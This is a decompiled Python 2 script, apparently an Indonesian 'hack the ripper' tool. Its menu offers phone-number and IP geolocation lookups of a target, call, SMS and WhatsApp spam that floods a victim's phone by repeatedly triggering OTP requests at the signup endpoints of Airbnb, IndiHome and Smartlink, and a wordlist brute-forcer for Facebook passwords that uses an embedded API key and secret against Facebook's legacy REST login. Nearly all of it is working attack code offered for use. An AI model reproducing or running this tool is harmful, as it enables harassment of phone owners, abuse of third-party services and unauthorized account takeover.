# Decompile by KangEhem:)
# with (uncompyle6) version : 3.7.4
# Time Succes decompile : 2022-01-18 14:58:21.983371
try:
    import os, sys, json, time, mechanize, cookielib, random, requests, hashlib, urllib, subprocess as sp, os, time, sys, requests, random, json
    from urllib import *
    from bs4 import BeautifulSoup as bs
except ImportError:
    print '\x1b[35m[=] \x1b[31mSorry Import Error'
API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
hijau = '\x1b[32m'
cyan = '\x1b[36m'
kuning = '\x1b[33;1m'
ungu = '\x1b[35m'
putih = '\x1b[37m'
biru = '\x1b[34m'
merah = '\x1b[1;91m'
lfa = 0
nom = []
logo = "\n\x1b[32m     .---. .-..---. .---.  .--. .---.\n     : .; :: :: .; :: .; :: .--': .; :\n     :   .': ::  _.':  _.': `;  :   .'\n     : :.`.: :: :   : :   : :__ : :.`.\n     :_;:_;:_;:_;   :_;   `.__.':_;:_;\n\x1b[31m+------------------------------------------+"
menu = ' \x1b[31m[\x1b[32m01\x1b[31m]\x1b[37m Lacak Ripper Dengan Nomor HP\n \x1b[31m[\x1b[32m02\x1b[31m]\x1b[37m Lacak Ripper Dengan Nomor IP\n \x1b[31m[\x1b[32m03\x1b[31m]\x1b[37m Serang Ripper Dengan Spam\n \x1b[31m[\x1b[32m04\x1b[31m]\x1b[37m Hack Facebook Si Ripper\n \x1b[31m[\x1b[32m05\x1b[31m]\x1b[37m Info Tools\n \x1b[31m[\x1b[32m00\x1b[31m]\x1b[37m Keluar Program\n\x1b[31m+------------------------------------------+'
def keluar():
    print '\x1b[31m[=]\x1b[37m Keluar'
    sys.exit()
def main():
    os.system('clear')
    print logo
    print menu
    pilih = raw_input('%s[=] %sPilih Menu%s >>%s ' % (hijau, putih, merah, ungu))
    if pilih == '':
        print '\x1b[31m[\xc3\x97]\x1b[37m Pilihan Kamu Salah'
        time.sleep(2)
        main()
    elif pilih == '1' or pilih == '01':
        lacaknope()
    elif pilih == '2' or pilih == '02':
        lacakip()
    elif pilih == '3' or pilih == '03':
        spam()
    elif pilih == '4' or pilih == '04':
        hackfb()
    elif pilih == '5' or pilih == '05':
        info()
    elif pilih == '0' or pilih == '00':
        keluar()
    else:
        print '\x1b[31m[\xc3\x97]\x1b[37m Pilihan Kamu Salah'
        time.sleep(2)
        hackfb()
def info():
    os.system('clear')
    print logo
    print '    \x1b[37m Author \x1b[31m:\x1b[32m Rizky\n     \x1b[37mGithub \x1b[31m: \x1b[32mhttps://github.com/hekelpro\n     \x1b[37msupport\x1b[31m: \x1b[32mFachri VoltHz ID\n\x1b[31m+------------------------------------------+'
    raw_input('\n\n   \x1b[31m[\x1b[37m ENTER UNTUK KEMBALI\x1b[31m ]')
    main()
def lacaknope():
    os.system('clear')
    print logo
    try:
        print '          %s<=[%sEx%s: %s08\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97%s]=>\n' % (merah, kuning, hijau, putih, merah)
        nomor = str(raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Masukan Nomor HP Target \x1b[31m:\x1b[32m '))
        if nomor.isalpha():
            print '\x1b[37m[\x1b[31m=\x1b[37m]\x1b[31m Nomor Tidak Ditemukan'
            sys.exit()
        url = 'http://api.antideo.com/phone/id/{}'
        kk = requests.get
        tus = kk(url.format(nomor))
        print tus
        z = json.loads(tus.text)
        print '\x1b[31m+------------------------------------------+'
        print '\x1b[32m [\xe2\x9c\x93]\x1b[37m Phone     \x1b[1;91m:\x1b[32m ' + str(z['phone'])
        nom.append(z['phone'])
        print ' [\xe2\x9c\x93]\x1b[37m Valid     \x1b[1;91m:\x1b[32m ' + str(z['valid'])
        print ' [\xe2\x9c\x93]\x1b[37m Type      \x1b[1;91m:\x1b[32m ' + str(z['type'])
        print ' [\xe2\x9c\x93]\x1b[37m Location  \x1b[1;91m:\x1b[32m ' + str(z['location'][:51])
        print ' [\xe2\x9c\x93]\x1b[37m Carrier   \x1b[1;91m:\x1b[32m ' + str(z['carrier'])
        print ' [\xe2\x9c\x93]\x1b[37m Timezones \x1b[1;91m:\x1b[32m ' + str(z['timezones'])
        print ' [\xe2\x9c\x93]\x1b[37m E164      \x1b[1;91m:\x1b[32m ' + str(z['formats']['E164'])
        print ' [\xe2\x9c\x93]\x1b[37m National  \x1b[1;91m:\x1b[32m ' + str(z['formats']['national'])
        print ' [\xe2\x9c\x93]\x1b[37m International \x1b[1;91m:\x1b[32m ' + str(z['formats']['international'])
        print '\x1b[31m+------------------------------------------+'
        raw_input('\n\x1b[31m[\x1b[37m ENTER UNTUK KEMBALI\x1b[31m ]')
        main()
    except (KeyboardInterrupt, EOFError):
        print '\n%s{%s!%s} %sKeyboard Interrupt\n' % (putih, merah, putih, putih)
        keluar()
    except requests.exceptions.ConnectionError:
        print '%s[%sx%s] %sTidak ada koneksi ' % (putih, merah, putih, putih)
        keluar()
def lacakip():
    os.system('clear')
    print logo
    try:
        ip = str(raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Masukan Nomor IP Target \x1b[31m:\x1b[32m '))
        url = 'http://ip-api.com/json/' + ip
        data = urlopen(url).read().decode('utf-8')
        data2 = eval(data)
        print '\x1b[31m+------------------------------------------+'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m AS           \x1b[0;31m:\x1b[0;32m ', str(data2['as'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m COUNTRY      \x1b[0;31m:\x1b[0;32m ', str(data2['country'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m CITY         \x1b[0;31m:\x1b[0;32m ', str(data2['city'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m COUNTRY CODE \x1b[0;31m:\x1b[0;32m ', str(data2['countryCode'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m ISP          \x1b[0;31m:\x1b[0;32m ', str(data2['isp'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m LATITUDE     \x1b[0;31m:\x1b[0;32m ', str(data2['lat'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m LONGTITUDE   \x1b[0;31m:\x1b[0;32m ', str(data2['lon'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m ORG          \x1b[0;31m:\x1b[0;32m ', str(data2['org'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m QUERY        \x1b[0;31m:\x1b[0;32m ', str(data2['query'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m REGION       \x1b[0;31m:\x1b[0;32m ', str(data2['region'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m REGION NAME  \x1b[0;31m:\x1b[0;32m ', str(data2['regionName'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m TIME ZONE    \x1b[0;31m:\x1b[0;32m ', str(data2['timezone'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m ZIP          \x1b[0;31m:\x1b[0;32m ', str(data2['zip'])
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m MAPS         \x1b[0;31m:\x1b[0;32m  https://www.google.co.id/maps/place/' + str(data2['lat']) + ',' + str(data2['lon'])
        except KeyError:
            print '\x1b[0;34m                    ~> \x1b[31;1munknown'
        try:
            print '\x1b[0;34m[+]\x1b[1;37m STATUS       \x1b[0;31m:\x1b[0;32m ', str(data2['status'])
            print '\x1b[31m+------------------------------------------+'
            raw_input('\n\x1b[31m[\x1b[37m ENTER UNTUK KEMBALI\x1b[31m ]')
            main()
        except KeyError:
            print '\x1b[0;34m~> \x1b[31;1mFailed'
    except (KeyboardInterrupt, EOFError):
        print '\n%s{%s!%s} %sKeyboard Interrupt\n' % (putih, merah, putih, putih)
        keluar()
    except requests.exceptions.ConnectionError:
        print '%s[%sx%s] %sTidak ada koneksi ' % (putih, merah, putih, putih)
        keluar()
def spam():
    os.system('clear')
    print logo
    print ' \x1b[31m[\x1b[32m01\x1b[31m]\x1b[37m Spam Call'
    print ' \x1b[31m[\x1b[32m02\x1b[31m]\x1b[37m Spam Sms'
    print ' \x1b[31m[\x1b[32m03\x1b[31m]\x1b[37m Spam Wa'
    print ' \x1b[31m[\x1b[32m00\x1b[31m]\x1b[37m Back'
    print '\x1b[31m+------------------------------------------+'
    pilih = raw_input('%s[=] %sPilih Menu%s >>%s ' % (hijau, putih, merah, ungu))
    if pilih == '':
        print '\x1b[31m[\xc3\x97]\x1b[37m Pilihan Kamu Salah'
        time.sleep(2)
        spam()
    elif pilih == '1' or pilih == '01':
        call()
    elif pilih == '2' or pilih == '02':
        sms()
    elif pilih == '3' or pilih == '03':
        wa()
    elif pilih == '0' or pilih == '00':
        main()
    else:
        print '\x1b[31m[\xc3\x97]\x1b[37m Pilihan Kamu Salah'
        time.sleep(2)
        hackfb()
def wa():
    os.system('clear')
    print logo
    print '          %s<=[%sEx%s: %s628\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97%s]=>\n' % (merah, kuning, hijau, putih, merah)
    no = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Masukan Nomor HP Target \x1b[31m:\x1b[32m ')
    if no.isalpha():
        print '\x1b[37m[\x1b[31m=\x1b[37m]\x1b[31m Nomor Tidak Ditemukan'
        time.sleep(2)
        spam()
    jml = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Masukan Jumlah Spam \x1b[31m:\x1b[32m ')
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'Connection': 'keep-alive', 'Accept': 'application/json, text/javascript, */*; q=0.01', 'X-Requested-With': 'XMLHttpRequest', 'Save-Data': 'on', 'user-agent': '{acak}', 'referer': 'https://bos.smartlink.id/register', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.get('https://bos.smartlink.id/getOTPRegister/' + no + '/wa', headers=hd)
            if 'success' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi ' % (putih, merah, putih, putih)
            keluar()
    raw_input('\n\x1b[31m[\x1b[37m ENTER UNTUK KEMBALI\x1b[31m ]')
    spam()
def sms():
    os.system('clear')
    print logo
    print '          %s<=[%sEx%s: %s08\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97%s]=>\n' % (merah, kuning, hijau, putih, merah)
    no = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Masukan Nomor HP Target \x1b[31m:\x1b[32m ')
    if no.isalpha():
        print '\x1b[37m[\x1b[31m=\x1b[37m]\x1b[31m Nomor Tidak Ditemukan'
        time.sleep(2)
        spam()
    jml = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Masukan Jumlah Spam \x1b[31m:\x1b[32m ')
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    hd = {'origin': 'https://sobat.indihome.co.id', 'x-requested-with': 'XMLHttpRequest', 'user-agent': '{acak}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'referer': 'https://sobat.indihome.co.id/register', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    r = requests.Session()
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://sobat.indihome.co.id/ajaxreg/msisdnGetOtp', headers=hd, data={'type': 'hp', 'msisdn': no})
            if 'Kode verifikasi telah dikirim' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi ' % (putih, merah, putih, putih)
            keluar()
    raw_input('\n\x1b[31m[\x1b[37m ENTER UNTUK KEMBALI\x1b[31m ]')
    spam()
def call():
    os.system('clear')
    print logo
    print '          %s<=[%sEx%s: %s628\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97%s]=>\n' % (merah, kuning, hijau, putih, merah)
    no = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Masukan Nomor HP Target \x1b[31m:\x1b[32m ')
    if no.isalpha():
        print '\x1b[37m[\x1b[31m=\x1b[37m]\x1b[31m Nomor Tidak Ditemukan'
        time.sleep(2)
        spam()
    jml = raw_input('\x1b[37m[\x1b[32m=\x1b[37m]\x1b[37m Masukan Jumlah Spam \x1b[31m:\x1b[32m ')
    agent = requests.get('https://pastebin.com/raw/QckwZTMc').text.split('\n')
    acak = random.choice(agent)
    r = requests.Session()
    hd = {'content-length': '82', 'origin': 'https://www.airbnb.co.id', 'x-csrf-token': 'V4$.airbnb.co.id$NeEJZxARGJA$r3bBAEtLKJ7cH3yiFNUKlxsckvHI1tHK4uAJADeUn_A=', 'x-csrf-without-token': '1', 'user-agent': '{acak}', 'content-type': 'application/json', 'accept': 'application/json, text/javascript, */*; q=0.01', 'cache-control': 'no-cache', 'x-requested-with': 'XMLHttpRequest', 'referer': 'https://www.airbnb.co.id/signup_login', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
    z = 0
    for x in range(int(jml)):
        try:
            z += 1
            a = r.post('https://www.airbnb.co.id/api/v2/phone_one_time_passwords?currency=USD&key=d306zoyjsyarp7ifhu67rjxn52tv0t20&locale=id', headers=hd, json={'phoneNumber': no, 'workFlow': 'GLOBAL_SIGNUP_LOGIN', 'otpMethod': 'CALL'})
            if 'true' in a.text:
                print '%s[%s%s%s] %sSukses spam ke %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
            else:
                print '%s[%s%s%s] %sGagal spam ke %s%s' % (merah, hijau, z, merah, putih, biru, no)
                time.sleep(0.1)
        except requests.exceptions.ConnectionError:
            print '%s[%sx%s] %sTidak ada koneksi ' % (putih, merah, putih, putih)
            keluar()
    raw_input('\n\x1b[31m[\x1b[37m ENTER UNTUK KEMBALI\x1b[31m ]')
    spam()
def hackfb():
    os.system('clear')
    print logo
    print ' \x1b[31m[\x1b[32m01\x1b[31m]\x1b[37m Hack Facebook Narget'
    print ' \x1b[31m[\x1b[32m02\x1b[31m]\x1b[37m >>>\x1b[35m  coming soon\x1b[37m   <<<'
    print ' \x1b[31m[\x1b[32m00\x1b[31m]\x1b[37m Back'
    print '\x1b[31m+------------------------------------------+'
    pilih = raw_input('%s[=] %sPilih Menu%s >>%s ' % (hijau, putih, merah, ungu))
    if pilih == '':
        print '\x1b[31m[\xc3\x97]\x1b[37m Pilihan Kamu Salah'
        time.sleep(2)
        hackfb()
    elif pilih == '1' or pilih == '01':
        hack()
    elif pilih == '2' or pilih == '02':
        print '\x1b[31m[\xc3\x97]\x1b[37m Kubilang Coming Soon Goblok'
        time.sleep(2)
        hackfb()
    elif pilih == '0' or pilih == '00':
        main()
    else:
        print '\x1b[31m[\xc3\x97]\x1b[37m Pilihan Kamu Salah'
        time.sleep(2)
        hackfb()
def hack():
    try:
        userid = raw_input('\x1b[32m[*]\x1b[37m Masukan ID Target\x1b[31m :\x1b[32m ')
        passlist = raw_input('\x1b[32m[*]\x1b[37m Masukan Wordlist \x1b[31m :\x1b[32m ')
        if os.path.exists(passlist) != False:
            print '\x1b[31m+------------------------------------------+'
            print (' \x1b[32m[+]\x1b[37m Account to crack\x1b[31m :\x1b[32m {}').format(userid)
            print (' \x1b[32m[+]\x1b[37m Jumlah Password \x1b[31m :\x1b[32m {}').format(len(open(passlist, 'r').read().split('\n')))
            print '\x1b[31m+------------------------------------------+'
            for passwd in open(passlist, 'r').readlines():
                sys.stdout.write((u'\x1b[1000D\x1b[32m[*] \x1b[37mTrying\x1b[32m {}\n').format(passwd.strip()))
                sys.stdout.flush()
                sig = ('api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}').format(userid, passwd.strip(), API_SECRET)
                xx = hashlib.md5(sig).hexdigest()
                data = ('api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}').format(userid, passwd.strip(), xx)
                response = urllib.urlopen(('https://api.facebook.com/restserver.php?{}').format(data)).read()
                if 'error' in response:
                    pass
                else:
                    print ('\n\x1b[32m[+]\x1b[37m PASSWORD DAPAT BOS\x1b[31m >>\x1b[32m {}').format(passwd.strip())
                    break
            raw_input('\n\x1b[31m[\x1b[37m ENTER UNTUK KEMBALI\x1b[31m ]')
            main()
        else:
            print '\x1b[31m[\xc3\x97]\x1b[37m Wordlist Tidak Ditemukan'
            time.sleep(2)
            hackfb()
    except KeyboardInterrupt:
        print '\x1b[31m[\x1b[37merror\x1b[31m]=[\x1b[31m Keyboard interrupt'
if __name__ == '__main__':
    main()
# Mau Ngapain Cuk?